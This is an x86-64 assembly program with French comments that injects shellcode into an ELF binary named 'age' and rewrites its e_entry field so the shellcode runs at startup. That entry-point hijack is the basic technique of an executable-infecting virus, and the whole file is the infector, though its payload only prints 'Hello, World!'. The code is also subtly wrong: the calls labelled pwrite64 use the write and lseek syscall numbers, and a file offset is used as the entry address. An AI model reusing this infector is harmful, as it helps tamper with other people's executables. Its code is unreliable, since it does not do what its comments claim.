section .data
filename db 'age', 0               ; Nom du fichier ELF cible
entry_offset equ 0x18              ; Offset de e_entry dans l'en-tête ELF
shellcode:                         ; Shellcode pour afficher "Hello, World!"
    call get_message               ; Calculer dynamiquement l'adresse du message
get_message:
    pop rsi                        ; Adresse du message dans RSI
    mov rax, 1                     ; syscall write
    mov rdi, 1                     ; stdout
    mov rdx, msg_len               ; Taille du message
    syscall

    mov rax, 60                    ; syscall exit
    xor rdi, rdi                   ; Code de retour 0
    syscall

msg db "Hello, World!", 0xA        ; Le message
msg_len equ $ - msg                ; Taille du message
shellcode_size equ $ - shellcode   ; Taille totale du shellcode

section .bss
buffer resb 32768                  ; Buffer pour stocker le contenu ELF

section .text
global _start

_start:
    ; 1. Ouvrir le fichier ELF cible
    mov rax, 2                    ; sys_open
    lea rdi, [rel filename]       ; Nom du fichier ELF
    mov rsi, 2                    ; O_RDWR (lecture/écriture)
    syscall
    cmp rax, 0
    js error_exit
    mov r8, rax                   ; Sauvegarder le descripteur de fichier

    ; 2. Lire le contenu ELF
    mov rax, 0                    ; sys_read
    mov rdi, r8                   ; Descripteur de fichier
    lea rsi, [rel buffer]         ; Buffer pour lecture
    mov rdx, 32768                ; Taille maximale
    syscall

    ; 3. Injecter le shellcode à l'offset 0x4000
    mov rax, 1                    ; sys_pwrite64
    mov rdi, r8                   ; Descripteur de fichier
    lea rsi, [rel shellcode]      ; Adresse du shellcode
    mov rdx, shellcode_size       ; Taille du shellcode
    mov r10, 0x4000               ; Offset d'injection
    syscall

    ; 4. Modifier l'entrée principale (e_entry)
    mov rax, 8                    ; sys_pwrite64
    mov rdi, r8                   ; Descripteur de fichier
    mov rsi, r10                  ; Nouvelle adresse d'entrée principale (0x4000)
    mov rdx, 8                    ; Taille de l'adresse
    mov r10, entry_offset         ; Offset de e_entry (0x18 dans l'en-tête ELF)
    syscall

    ; 5. Fermer le fichier
    mov rax, 3                    ; sys_close
    mov rdi, r8                   ; Descripteur de fichier
    syscall

    ; 6. Quitter proprement
    xor rdi, rdi                  ; Code de sortie 0
    mov rax, 60                   ; sys_exit
    syscall

error_exit:
    mov rdi, 1                    ; Code d'erreur 1
    mov rax, 60                   ; sys_exit
    syscall

